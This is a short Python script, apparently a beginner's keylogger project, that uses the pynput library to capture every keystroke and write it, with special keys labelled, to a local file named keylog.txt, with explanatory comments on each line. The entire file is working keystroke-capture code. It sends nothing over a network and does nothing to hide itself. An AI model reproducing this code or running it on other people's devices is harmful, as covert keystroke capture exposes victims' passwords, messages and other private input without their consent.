from pynput import keyboard     #allows us to listen which key pressed
import logging                  #allows us to log the key pressed into a File

log_file="keylog.txt"        #keys pressed will be saved in the keylogger file

logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(message)s")  #filename is specified, debug level logging means it saves all kinds of logs including errors, format specifies how the log should be saved in the file

def key_press(key):
    try:
        if key == keyboard.Key.space:
            logging.info("<space>")
        elif key == keyboard.Key.enter:
            logging.info("<enter>")
        elif key == keyboard.Key.backspace:
            logging.info("<backspace>")
        elif key == keyboard.Key.shift:
            logging.info("<shift>")
        elif key == keyboard.Key.ctrl:
            logging.info("<ctrl>")
        elif key == keyboard.Key.alt:
            logging.info("<alt>")
        elif key == keyboard.Key.tab:
            logging.info("<tab>")
        elif key == keyboard.Key.esc:
            logging.info("<esc>")
        else:
            logging.info(str(key))  #saves the key pressed as string 
    except Exception as e:
        print(f"Error: {e}")        #used for catching error and storing, f is a formatted string that makes error message readable


with keyboard.Listener(on_press=key_press) as listener:   #calls on_press function each time any key is pressed
    listener.join()